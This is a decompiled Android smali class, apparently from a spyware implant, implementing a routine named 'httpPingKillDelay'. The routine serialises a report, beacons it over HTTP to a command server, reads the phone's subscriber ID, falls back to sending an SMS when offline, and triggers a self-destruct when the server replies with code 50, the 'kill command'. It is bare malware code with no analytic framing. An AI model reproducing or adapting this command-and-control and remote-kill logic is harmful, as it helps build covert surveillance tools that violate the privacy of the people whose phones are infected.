.class final Lcom/network/android/a/e;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:J

.field final synthetic b:Landroid/content/Context;


# direct methods
.method constructor <init>(JLandroid/content/Context;)V
    .locals 0

    iput-wide p1, p0, Lcom/network/android/a/e;->a:J

    iput-object p3, p0, Lcom/network/android/a/e;->b:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 7

    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "httpPingKillDelay exce: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-wide v1, p0, Lcom/network/android/a/e;->a:J

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Landroid/util/Xml;->newSerializer()Lorg/xmlpull/v1/XmlSerializer;

    move-result-object v0

    new-instance v1, Ljava/io/StringWriter;

    invoke-direct {v1}, Ljava/io/StringWriter;-><init>()V

    iget-object v2, p0, Lcom/network/android/a/e;->b:Landroid/content/Context;

    invoke-static {v0, v1}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    invoke-static {v0}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;)V

    new-instance v0, Lcom/network/android/g;

    invoke-direct {v0}, Lcom/network/android/g;-><init>()V

    new-instance v2, Lcom/network/android/x;

    iget-object v0, p0, Lcom/network/android/a/e;->b:Landroid/content/Context;

    invoke-direct {v2, v0}, Lcom/network/android/x;-><init>(Landroid/content/Context;)V

    iget-object v0, p0, Lcom/network/android/a/e;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/SmsReceiver;->c(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1}, Ljava/io/StringWriter;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v3, 0x0

    const/4 v4, 0x0

    iget-object v5, p0, Lcom/network/android/a/e;->b:Landroid/content/Context;

    const/4 v6, 0x0

    invoke-static/range {v0 .. v6}, Lcom/network/android/g;->a(Ljava/lang/String;Ljava/lang/String;Lcom/network/android/x;[Ljava/lang/String;[[BLandroid/content/Context;[B)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "httpPingKillDelay provHandler.retCode: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget v1, v2, Lcom/network/android/x;->a:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget v0, v2, Lcom/network/android/x;->a:I

    if-nez v0, :cond_0

    const-string v0, "httpPingKillDelay - Succes in send Ping"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/a/e;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/h/b;->a(Landroid/content/Context;)V

    :goto_0
    return-void

    :cond_0
    iget v0, v2, Lcom/network/android/x;->a:I

    const/4 v1, -0x1

    if-ne v0, v1, :cond_2

    const-string v0, "sendHttp -  Fail to send Ping: "

    invoke-static {v0}, Lcom/network/android/c/a/a;->b(Ljava/lang/String;)V

    const-string v0, "kill - no internet!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/a/e;->b:Landroid/content/Context;

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_1

    const-string v0, "ping SMS httpFirstLastPing not on line send sms mo kill"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/a/e;->b:Landroid/content/Context;

    const/4 v1, 0x5

    invoke-static {v0, v1}, Lcom/network/android/a/c;->b(Landroid/content/Context;I)V

    :cond_1
    iget-object v0, p0, Lcom/network/android/a/e;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/h/b;->a(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "httpPingKillDelay: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0

    :cond_2
    :try_start_1
    iget v0, v2, Lcom/network/android/x;->a:I

    const/16 v1, 0x32

    if-ne v0, v1, :cond_3

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "sendHttp -  retCode == 50 !!! kill command !!!: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, v2, Lcom/network/android/x;->b:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/a/e;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/h/b;->a(Landroid/content/Context;)V

    goto :goto_0

    :cond_3
    const-string v0, "httpPingKillDelay - other case"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/a/e;->b:Landroid/content/Context;

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_4

    const-string v0, "ping SMS httpFirstLastPing not on line send sms mo kill"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/a/e;->b:Landroid/content/Context;

    const/4 v1, 0x5

    invoke-static {v0, v1}, Lcom/network/android/a/c;->b(Landroid/content/Context;I)V

    :cond_4
    iget-object v0, p0, Lcom/network/android/a/e;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/h/b;->a(Landroid/content/Context;)V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0
.end method
